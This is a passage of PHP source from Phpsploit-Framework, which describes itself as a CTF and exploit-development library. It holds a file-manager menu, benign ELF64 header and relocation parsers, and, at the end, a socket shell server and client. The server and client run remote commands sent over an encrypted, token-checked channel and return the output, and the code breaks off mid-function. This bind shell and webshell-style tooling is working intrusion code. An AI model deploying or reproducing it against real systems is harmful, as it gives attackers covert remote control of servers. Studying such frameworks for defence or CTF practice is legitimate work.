        if ( ( ! isset( $params[ "clear" ][ "current_directory_path" ] ) ) || ( ! is_string ( $params[ "clear" ][ "current_directory_path" ] ) ) ) {
            $params[ "clear" ][ "current_directory_path" ] = str_replace ( "\\" , "/" , $_SERVER[ "DOCUMENT_ROOT" ] );
        }

        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "search" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/file/search" , array ( "rand" => time () , "current_directory_path" => $params[ "search" ][ "current_directory_path" ] , "file_name" => $params[ "search" ][ "file_name" ] ) ) ,
                ) ,
                array (
                    "title"    => "explorer" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/file/explorer" , array ( "rand" => time () , "current_directory_path" => $params[ "explorer" ][ "current_directory_path" ] ) ) ,
                ) ,
                array (
                    "title"    => "create" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/file/create" , array ( "rand" => time () , "current_directory_path" => $params[ "create" ][ "current_directory_path" ] , "data_type" => $params[ "create" ][ "data_type" ] ) ) ,
                ) ,
                array (
                    "title"    => "upload" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/file/upload" , array ( "rand" => time () , "current_directory_path" => $params[ "upload" ][ "current_directory_path" ] , ) ) ,
                ) ,
                array (
                    "title"    => "clear" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/file/clear" , array ( "rand" => time () , "current_directory_path" => $params[ "clear" ][ "current_directory_path" ] , "file_name" => $params[ "clear" ][ "file_name" ] ) ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 下午10:21
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Rel extends Class_Base
{
    const SIZE_R_OFFSET = ( Class_Base_Elf64::SIZE_ELF64_ADDR );
    const SIZE_R_INFO   = ( Class_Base_Elf64::SIZE_ELF64_XWORD );


    const PURPOSE_R_OFFSET = "";
    const PURPOSE_R_INFO   = "";


    private static $_elf64_rels = array ();

    public $r_offset = null;
    public $r_info   = null;


    public static function get_rel_size ()
    {
        $_rel_size = ( self::SIZE_R_OFFSET + self::SIZE_R_INFO );
        return $_rel_size;
    }

    public static function get_r_offset_offset ()
    {
        $_offset = ( Class_Base_Elf::OFFSET_START );
        return $_offset;
    }

    public static function get_r_info_offset ()
    {
        $_offset = ( self::get_r_offset_offset () + self::SIZE_R_OFFSET );
        return $_offset;
    }

    public static function create_elf64_rel ( $filepath , $r_offset , $r_info )
    {
        self::$_elf64_rels[ $filepath ] = new Class_Base_Elf64_Rel( $r_offset , $r_info );
    }

    public function __construct ( $r_offset , $r_info )
    {
        $this->r_offset = $r_offset;
        $this->r_info   = $r_info;

    }

    public function __destruct ()
    {
        $this->r_offset = null;
        $this->r_info   = null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 上午9:54
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_File_Header extends Class_Base_Elf
{
    const ALIAS = 'Elf64_Ehdr';

    const SIZE_E_IDENT     = SIZE_UNSIGNED_CHAR_16;
    const SIZE_E_TYPE      = Class_Base_Elf64::SIZE_ELF64_HALF;
    const SIZE_E_MACHINE   = Class_Base_Elf64::SIZE_ELF64_HALF;
    const SIZE_E_VERSION   = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_E_ENTRY     = Class_Base_Elf64::SIZE_ELF64_ADDR;
    const SIZE_E_PHOFF     = Class_Base_Elf64::SIZE_ELF64_OFF;
    const SIZE_E_SHOFF     = Class_Base_Elf64::SIZE_ELF64_OFF;
    const SIZE_E_FLAGS     = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_E_EHSIZE    = Class_Base_Elf64::SIZE_ELF64_HALF;
    const SIZE_E_PHENTSIZE = Class_Base_Elf64::SIZE_ELF64_HALF;
    const SIZE_E_PHNUM     = Class_Base_Elf64::SIZE_ELF64_HALF;
    const SIZE_E_SHENTSIZE = Class_Base_Elf64::SIZE_ELF64_HALF;
    const SIZE_E_SHNUM     = Class_Base_Elf64::SIZE_ELF64_HALF;
    const SIZE_E_SHSTRNDX  = Class_Base_Elf64::SIZE_ELF64_HALF;

    const PURPOSE_E_IDENT     = "ELF identification";
    const PURPOSE_E_TYPE      = "Object file type";
    const PURPOSE_E_MACHINE   = "Machine type";
    const PURPOSE_E_VERSION   = "Object file version";
    const PURPOSE_E_ENTRY     = "Entry point address";
    const PURPOSE_E_PHOFF     = "Program header offset";
    const PURPOSE_E_SHOFF     = "Section header offset";
    const PURPOSE_E_FLAGS     = "Processor-specific flags";
    const PURPOSE_E_EHSIZE    = "ELF header size";
    const PURPOSE_E_PHENTSIZE = "Size of program header entry";
    const PURPOSE_E_PHNUM     = "Number of program header entries";
    const PURPOSE_E_SHENTSIZE = "Size of section header entry";
    const PURPOSE_E_SHNUM     = "Number of section header entries";
    const PURPOSE_E_SHSTRNDX  = "Section name string table index";

    private static $_elf64_ehdrs = array ();

    public $e_ident     = null;
    public $e_type      = null;
    public $e_machine   = null;
    public $e_version   = null;
    public $e_entry     = null;
    public $e_phoff     = null;
    public $e_shoff     = null;
    public $e_flags     = null;
    public $e_ehsize    = null;
    public $e_phentsize = null;
    public $e_phnum     = null;
    public $e_shentsize = null;
    public $e_shnum     = null;
    public $e_shstrndx  = null;


    public static function create_elf64_ehdr ( $filepath , $e_ident , $e_type , $e_machine , $e_version , $e_entry , $e_phoff , $e_shoff , $e_flags , $e_ehsize , $e_phentsize , $e_phnum , $e_shentsize , $e_shnum , $e_shstrndx )
    {
        self::$_elf64_ehdrs[ $filepath ] = $_elf64_ehdr = new Class_Base_Elf64_File_Header( $e_ident , $e_type , $e_machine , $e_version , $e_entry , $e_phoff , $e_shoff , $e_flags , $e_ehsize , $e_phentsize , $e_phnum , $e_shentsize , $e_shnum , $e_shstrndx );
        return $_elf64_ehdr;
    }

    public function __construct ( $e_ident , $e_type , $e_machine , $e_version , $e_entry , $e_phoff , $e_shoff , $e_flags , $e_ehsize , $e_phentsize , $e_phnum , $e_shentsize , $e_shnum , $e_shstrndx )
    {
        $this->e_ident     = $e_ident;
        $this->e_type      = $e_type;
        $this->e_machine   = $e_machine;
        $this->e_version   = $e_version;
        $this->e_entry     = $e_entry;
        $this->e_phoff     = $e_phoff;
        $this->e_shoff     = $e_shoff;
        $this->e_flags     = $e_flags;
        $this->e_ehsize    = $e_ehsize;
        $this->e_phentsize = $e_phentsize;
        $this->e_phnum     = $e_phnum;
        $this->e_shentsize = $e_shentsize;
        $this->e_shnum     = $e_shnum;
        $this->e_shstrndx  = $e_shstrndx;
    }

    public function __destruct ()
    {
        $this->e_ident     = null;
        $this->e_type      = null;
        $this->e_machine   = null;
        $this->e_version   = null;
        $this->e_entry     = null;
        $this->e_phoff     = null;
        $this->e_shoff     = null;
        $this->e_flags     = null;
        $this->e_ehsize    = null;
        $this->e_phentsize = null;
        $this->e_phnum     = null;
        $this->e_shentsize = null;
        $this->e_shnum     = null;
        $this->e_shstrndx  = null;
    }

    public static function get_alias ()
    {
        return self::ALIAS;
    }

    public static function get_file_header_offset ()
    {
        $_offset = ( self::get_e_ident_offset () );
        return $_offset;
    }

    public static function get_file_header_size ()
    {
        $_file_header_size = ( self::SIZE_E_IDENT + self::SIZE_E_TYPE + self::SIZE_E_MACHINE + self::SIZE_E_VERSION + self::SIZE_E_ENTRY + self::SIZE_E_PHOFF + self::SIZE_E_SHOFF + self::SIZE_E_FLAGS + self::SIZE_E_EHSIZE + self::SIZE_E_PHENTSIZE + self::SIZE_E_PHNUM + self::SIZE_E_SHENTSIZE + self::SIZE_E_SHNUM + self::SIZE_E_SHSTRNDX );
        return $_file_header_size;
    }

    public static function get_e_ident_offset ()
    {
        $_offset = ( Class_Base_Elf::OFFSET_START );
        return $_offset;
    }

    public static function get_e_type_offset ()
    {
        $_offset = ( self::get_e_ident_offset () + self::SIZE_E_IDENT );
        return $_offset;
    }

    public static function get_e_machine_offset ()
    {
        $_offset = ( self::get_e_type_offset () + self::SIZE_E_TYPE );
        return $_offset;
    }

    public static function get_e_version_offset ()
    {
        $_offset = ( self::get_e_machine_offset () + self::SIZE_E_MACHINE );
        return $_offset;
    }

    public static function get_e_entry_offset ()
    {
        $_offset = ( self::get_e_version_offset () + self::SIZE_E_VERSION );
        return $_offset;
    }

    public static function get_e_phoff_offset ()
    {
        $_offset = ( self::get_e_entry_offset () + self::SIZE_E_ENTRY );
        return $_offset;
    }

    public static function get_e_shoff_offset ()
    {
        $_offset = ( self::get_e_phoff_offset () + self::SIZE_E_PHOFF );
        return $_offset;
    }

    public static function get_e_flags_offset ()
    {
        $_offset = ( self::get_e_shoff_offset () + self::SIZE_E_SHOFF );
        return $_offset;
    }

    public static function get_e_ehsize_offset ()
    {
        $_offset = ( self::get_e_flags_offset () + self::SIZE_E_FLAGS );
        return $_offset;
    }

    public static function get_e_phentsize_offset ()
    {
        $_offset = ( self::get_e_ehsize_offset () + self::SIZE_E_EHSIZE );
        return $_offset;
    }

    public static function get_e_phnum_offset ()
    {
        $_offset = ( self::get_e_phentsize_offset () + self::SIZE_E_PHENTSIZE );
        return $_offset;
    }

    public static function get_e_shentsize_offset ()
    {
        $_offset = ( self::get_e_phnum_offset () + self::SIZE_E_PHNUM );
        return $_offset;
    }

    public static function get_e_shnum_offset ()
    {
        $_offset = ( self::get_e_shentsize_offset () + self::SIZE_E_SHENTSIZE );
        return $_offset;
    }

    public static function get_e_shstrndx_offset ()
    {
        $_offset = ( self::get_e_shnum_offset () + self::SIZE_E_SHNUM );
        return $_offset;
    }

    public function get_ei_magic_number ()
    {
        if ( ( is_string ( $this->e_ident ) ) && ( strlen ( $this->e_ident ) == 16 ) ) {
            $_magic_number = Class_Base_Format::get_format_hex_content ( substr ( $this->e_ident , 0 , 4 ) );
            return $_magic_number;
        }
        return false;
    }

    public function get_ei_class ()
    {
        if ( ( is_string ( $this->e_ident ) ) && ( strlen ( $this->e_ident ) == 16 ) ) {
            $_ei_class = Class_Base_Elf::unpack ( substr ( $this->e_ident , 4 , 1 ) , "C" );
            return $_ei_class;
        }
        return false;
    }

    public function get_ei_data ()
    {
        if ( ( is_string ( $this->e_ident ) ) && ( strlen ( $this->e_ident ) == 16 ) ) {
            $_ei_class = Class_Base_Elf::unpack ( substr ( $this->e_ident , 5 , 1 ) , "C" );
            return $_ei_class;
        }
        return false;
    }

    public function get_ei_version ()
    {
        if ( ( is_string ( $this->e_ident ) ) && ( strlen ( $this->e_ident ) == 16 ) ) {
            $_ei_class = Class_Base_Elf::unpack ( substr ( $this->e_ident , 6 , 1 ) , "C" );
            return $_ei_class;
        }
        return false;
    }

    public function get_ei_osabi ()
    {
        if ( ( is_string ( $this->e_ident ) ) && ( strlen ( $this->e_ident ) == 16 ) ) {
            $_ei_class = Class_Base_Elf::unpack ( substr ( $this->e_ident , 7 , 1 ) , "C" );
            return $_ei_class;
        }
        return false;
    }

    public function get_ei_abiversion ()
    {
        if ( ( is_string ( $this->e_ident ) ) && ( strlen ( $this->e_ident ) == 16 ) ) {
            $_ei_class = Class_Base_Elf::unpack ( substr ( $this->e_ident , 8 , 1 ) , "C" );
            return $_ei_class;
        }
        return false;
    }

    public function get_ei_pad ()
    {
        if ( ( is_string ( $this->e_ident ) ) && ( strlen ( $this->e_ident ) == 16 ) ) {
            $_ei_class = Class_Base_Format::get_format_hex_content ( substr ( $this->e_ident , 9 , 7 ) );
            return $_ei_class;
        }
        return false;
    }

    public function get_e_ident ()
    {
        $_hexs = Class_Base_Format::get_format_hex_content ( $this->e_ident );
        return $_hexs;
    }

    public function get_e_type ()
    {
        if ( ( is_string ( $this->e_type ) ) && ( strlen ( $this->e_type ) == 2 ) ) {
            $_elf_type = Class_Base_Elf::unpack ( substr ( $this->e_type , 0 , 2 ) , "v*" );
            return $_elf_type;
        }
        return false;
    }

    public function get_e_machine ()
    {
        if ( ( is_string ( $this->e_machine ) ) && ( strlen ( $this->e_machine ) == 2 ) ) {
            $_elf_machine = Class_Base_Elf::unpack ( substr ( $this->e_machine , 0 , 2 ) , "v*" );
            return $_elf_machine;
        }
        return false;
    }

    public function get_e_version ()
    {
        if ( ( is_string ( $this->e_version ) ) && ( strlen ( $this->e_version ) == 4 ) ) {
            $_elf_version = Class_Base_Elf::unpack ( substr ( $this->e_version , 0 , 4 ) , "V*" );
            return $_elf_version;
        }
        return false;
    }

    public function get_e_entry ()
    {
        if ( ( is_string ( $this->e_entry ) ) && ( strlen ( $this->e_entry ) == 8 ) ) {
            $_elf_entry = ( ( Class_Base_Elf::unpack ( substr ( $this->e_entry , 0 , 8 ) , "Q*" ) ) );
            return $_elf_entry;
        }
        return false;
    }

    public function get_e_phoff ()
    {
        if ( ( is_string ( $this->e_phoff ) ) && ( strlen ( $this->e_phoff ) == 8 ) ) {
            $_elf_phoff = ( ( Class_Base_Elf::unpack ( substr ( $this->e_phoff , 0 , 8 ) , "Q*" ) ) );
            return $_elf_phoff;
        }
        return false;
    }

    public function get_e_shoff ()
    {
        if ( ( is_string ( $this->e_shoff ) ) && ( strlen ( $this->e_shoff ) == 8 ) ) {
            $_elf_shoff = ( ( Class_Base_Elf::unpack ( substr ( $this->e_shoff , 0 , 8 ) , "Q*" ) ) );
            return $_elf_shoff;
        }
        return false;
    }

    public function get_e_flags ()
    {
        if ( ( is_string ( $this->e_flags ) ) && ( strlen ( $this->e_flags ) == 4 ) ) {
            $_elf_flags = ( ( Class_Base_Elf::unpack ( substr ( $this->e_flags , 0 , 4 ) , "V*" ) ) );
            return $_elf_flags;
        }
        return false;
    }

    public function get_e_ehsize ()
    {
        if ( ( is_string ( $this->e_ehsize ) ) && ( strlen ( $this->e_ehsize ) == 2 ) ) {
            $_elf_ehsize = ( ( Class_Base_Elf::unpack ( substr ( $this->e_ehsize , 0 , 2 ) , "v*" ) ) );
            return $_elf_ehsize;
        }
        return false;
    }

    public function get_e_phentsize ()
    {
        if ( ( is_string ( $this->e_phentsize ) ) && ( strlen ( $this->e_phentsize ) == 2 ) ) {
            $_elf_phentsize = ( ( Class_Base_Elf::unpack ( substr ( $this->e_phentsize , 0 , 2 ) , "v*" ) ) );
            return $_elf_phentsize;
        }
        return false;
    }

    public function get_e_phnum ()
    {
        if ( ( is_string ( $this->e_phnum ) ) && ( strlen ( $this->e_phnum ) == 2 ) ) {
            $_elf_phnum = ( ( Class_Base_Elf::unpack ( substr ( $this->e_phnum , 0 , 2 ) , "v*" ) ) );
            return $_elf_phnum;
        }
        return false;
    }

    public function get_e_shentsize ()
    {
        if ( ( is_string ( $this->e_shentsize ) ) && ( strlen ( $this->e_shentsize ) == 2 ) ) {
            $_elf_shentsize = ( ( Class_Base_Elf::unpack ( substr ( $this->e_shentsize , 0 , 2 ) , "v*" ) ) );
            return $_elf_shentsize;
        }
        return false;
    }

    public function get_e_shnum ()
    {
        if ( ( is_string ( $this->e_shnum ) ) && ( strlen ( $this->e_shnum ) == 2 ) ) {
            $_elf_shnum = ( ( Class_Base_Elf::unpack ( substr ( $this->e_shnum , 0 , 2 ) , "v*" ) ) );
            return $_elf_shnum;
        }
        return false;
    }

    public function get_e_shstrndx ()
    {
        if ( ( is_string ( $this->e_shstrndx ) ) && ( strlen ( $this->e_shstrndx ) == 2 ) ) {
            $_elf_shstrndx = ( ( Class_Base_Elf::unpack ( substr ( $this->e_shstrndx , 0 , 2 ) , "v*" ) ) );
            return $_elf_shstrndx;
        }
        return false;
    }

    public function get_format_file_header ()
    {
        $_format_file_header = array ();

        $_format_file_header[ "e_ident" ]                        = array ();
        $_format_file_header[ "e_ident" ][ "ei_magic_number" ]   = $this->get_ei_magic_number ();
        $_format_file_header[ "e_ident" ][ "ei_class" ]          = $this->get_ei_class ();
        $_format_file_header[ "e_ident" ][ "hex_ei_class" ]      = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_ei_class () ) );
        $_format_file_header[ "e_ident" ][ "ei_data" ]           = $this->get_ei_data ();
        $_format_file_header[ "e_ident" ][ "hex_ei_data" ]       = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_ei_data () ) );
        $_format_file_header[ "e_ident" ][ "ei_version" ]        = $this->get_ei_version ();
        $_format_file_header[ "e_ident" ][ "hex_ei_version" ]    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_ei_version () ) );
        $_format_file_header[ "e_ident" ][ "ei_osabi" ]          = $this->get_ei_osabi ();
        $_format_file_header[ "e_ident" ][ "hex_ei_osabi" ]      = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_ei_osabi () ) );
        $_format_file_header[ "e_ident" ][ "ei_abiversion" ]     = $this->get_ei_abiversion ();
        $_format_file_header[ "e_ident" ][ "hex_ei_abiversion" ] = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_ei_abiversion () ) );
        $_format_file_header[ "e_ident" ][ "ei_pad" ]            = $this->get_ei_pad ();
        $_format_file_header[ "e_type" ]                         = $this->get_e_type ();
        $_format_file_header[ "hex_e_type" ]                     = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_type () ) );
        $_format_file_header[ "e_machine" ]                      = $this->get_e_machine ();
        $_format_file_header[ "hex_e_machine" ]                  = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_machine () ) );
        $_format_file_header[ "e_version" ]                      = $this->get_e_version ();
        $_format_file_header[ "hex_e_version" ]                  = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_version () ) );
        $_format_file_header[ "e_entry" ]                        = $this->get_e_entry ();
        $_format_file_header[ "hex_e_entry" ]                    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_entry () ) );
        $_format_file_header[ "e_phoff" ]                        = $this->get_e_phoff ();
        $_format_file_header[ "hex_e_phoff" ]                    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_phoff () ) );
        $_format_file_header[ "e_shoff" ]                        = $this->get_e_shoff ();
        $_format_file_header[ "hex_e_shoff" ]                    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_shoff () ) );
        $_format_file_header[ "e_flags" ]                        = $this->get_e_flags ();
        $_format_file_header[ "hex_e_flags" ]                    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_flags () ) );
        $_format_file_header[ "e_ehsize" ]                       = $this->get_e_ehsize ();
        $_format_file_header[ "hex_e_ehsize" ]                   = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_ehsize () ) );
        $_format_file_header[ "e_phentsize" ]                    = $this->get_e_phentsize ();
        $_format_file_header[ "hex_e_phentsize" ]                = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_phentsize () ) );
        $_format_file_header[ "e_phnum" ]                        = $this->get_e_phnum ();
        $_format_file_header[ "hex_e_phnum" ]                    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_phnum () ) );
        $_format_file_header[ "e_shentsize" ]                    = $this->get_e_shentsize ();
        $_format_file_header[ "hex_e_shentsize" ]                = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_shentsize () ) );
        $_format_file_header[ "e_shnum" ]                        = $this->get_e_shnum ();
        $_format_file_header[ "hex_e_shnum" ]                    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_shnum () ) );
        $_format_file_header[ "e_shstrndx" ]                     = $this->get_e_shstrndx ();
        $_format_file_header[ "hex_e_shstrndx" ]                 = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_e_shstrndx () ) );

        return $_format_file_header;
    }

    public function get_program_header_offset ()
    {
        $_program_header_offset = $this->get_e_phoff ();
        return $_program_header_offset;
    }

    public function get_program_header_size ()
    {
        $_program_header_size = $this->get_e_phentsize ();
        return $_program_header_size;
    }

    public function get_program_header_count ()
    {
        $_program_header_count = $this->get_e_phnum ();
        return $_program_header_count;
    }

    public function get_section_header_offset ()
    {
        $_section_header_offset = $this->get_e_shoff ();
        return $_section_header_offset;
    }

    public function get_section_header_size ()
    {
        $_section_header_offset = $this->get_e_shentsize ();
        return $_section_header_offset;
    }

    public function get_section_header_count ()
    {
        $_section_header_count = $this->get_e_shnum ();
        return $_section_header_count;
    }

    public function get_section_header_sym_table_index ()
    {
        $_section_header_sym_table_index = $this->get_e_shstrndx ();
        return $_section_header_sym_table_index;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:03
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_SocketServerShell extends Class_Operate
{
    const EXCEPTION_MESSAGE_TOKEN_ERROR  = "token is error";
    const EXCEPTION_MESSAGE_CONNECT_QUIT = "connect is exit";
    const EXCEPTION_MESSAGE_CONNECT_EXIT = "connect service is exit";
    const EXCEPTION_BREAK                = 1;

    private static $_clientSocker       = null;
    private static $_serverSocket       = null;
    private static $_max_connect_number = 0;

    public static function start_client ( $ip , $port , $token , $encode_key , $encode_iv_base64 )
    {
        Class_Base_Response::outputln ( "" );
        try {
            self::$_clientSocker = Class_Base_Socket::create ();
            Class_Base_Socket::connect ( self::$_clientSocker , $ip , $port );
            while ( true ) {
                $_command = fgets ( STDIN );
                if ( ( is_string ( $_command ) ) && ( strlen ( $_command ) > 0 ) ) {
                    $_encode_iv = base64_decode ( $encode_iv_base64 );
                    $_output    = ( $token . chr ( 32 ) . $_command );
                    $_output    = Class_Base_Security::phpsploit_encode ( $_output , $encode_key , $_encode_iv );
                    Class_Base_Socket::write ( self::$_clientSocker , $_output , null );
                    $_exec_result = Class_Base_Socket::read ( self::$_clientSocker , ( 1024 * 1024 * 100 ) , PHP_BINARY_READ );
                    if ( ! empty( $_exec_result ) ) {
                        $_exec_result = Class_Base_Security::phpsploit_decode ( $_exec_result , $encode_key , $_encode_iv );
                        Class_Base_Response::outputln ( $_exec_result );
                    }
                    if ( str_replace ( "\n" , "" , str_replace ( "\r\n" , "" , $_command ) ) == "exit" ) {
                        break;
                    }
                }
            }
            Class_Base_Socket::close ( self::$_clientSocker );
        } catch ( \Exception $e ) {
            @Class_Base_Socket::close ( self::$_clientSocker );
            Class_Base_Response::outputln ( $e );
        }
        Class_Base_Response::outputln ( "\n" );
    }

    public static function start ( $ip , $port , $max_connect_number = 1 , $max_execute_time = 3600 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        try {
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Start , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient manager connect : " . $_SERVER[ "REMOTE_ADDR" ] . ":" . $_SERVER[ "REMOTE_PORT" ] . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "Shell Server is Start" );
            }
            self::create_token ( $connect_domain_List_id );
            Class_Base_Socket::init ( $max_execute_time );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\n" . 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) );
            }
            self::$_max_connect_number = $max_connect_number;
            self::$_serverSocket       = Class_Base_Socket::create ();
            Class_Base_Socket::set_block ( self::$_serverSocket );
            Class_Base_Socket::bind ( self::$_serverSocket , $ip , $port );
            Class_Base_Socket::listen ( self::$_serverSocket , self::$_max_connect_number );
            do {
                $token      = self::get_token ();
                $decode_key = self::get_decode_key ();
                $decode_iv  = self::get_decode_iv ();
                self::check_browser_service_stop ();
                try {
                    $_socket     = Class_Base_Socket::accept ( self::$_serverSocket );
                    $_clientinfo = Class_Base_Socket::getpeername ( $_socket );
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nReceived socket connection from client : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "Received socket connection from client : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) );
                    }
                    while ( true ) {
                        self::check_browser_service_stop ();
                        $command = Class_Base_Socket::read ( $_socket , ( 1024 * 1024 * 100 ) , PHP_BINARY_READ );
                        if ( ! empty( $command ) ) {
                            $command      = str_replace ( "\n" , "" , str_replace ( "\r" , "" , $command ) );
                            $command      = Class_Base_Security::phpsploit_decode ( $command , $decode_key , $decode_iv );
                            $command      = str_replace ( "\n" , "" , str_replace ( "\r" , "" , $command ) );
                            $request_info = explode ( " " , $command );
                            if ( count ( $request_info ) < 2 ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_QUIT , self::EXCEPTION_BREAK );
                            }
                            $request_token = $request_info[ 0 ];
                            array_shift ( $request_info );
                            $command = implode ( " " , $request_info );
                            if ( $request_token != $token ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_TOKEN_ERROR , self::EXCEPTION_BREAK );
                            }
                            if ( $command == "quit" ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_QUIT , self::EXCEPTION_BREAK );
                            }
                            if ( $command == "exit" ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                            }
                            if ( $command == chr ( 3 ) ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                            }
                            $_output        = Class_Base_Shell::command ( $command );
                            $_socket_output = self::array_split_to_string ( $_output );
                            $_socket_output = Class_Base_Security::phpsploit_encode ( $_socket_output , $decode_key , $decode_iv );
                            Class_Base_Socket::write ( $_socket , $_socket_output , null );
                            if ( ! is_cli () ) {
                                $_web_output = self::array_to_js_inner_html_string ( $_output );
                                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : " . "\n\n" . $_web_output ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                $_cli_output = $_socket_output;
                                Class_Base_Response::outputln ( "client : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : \n\n" . $_cli_output );
                            }
                        }
                        self::check_browser_service_stop ();
                    }
                } catch ( \Exception $e ) {
                    Class_Base_Socket::close ( $_socket );
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient socket connect is close : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
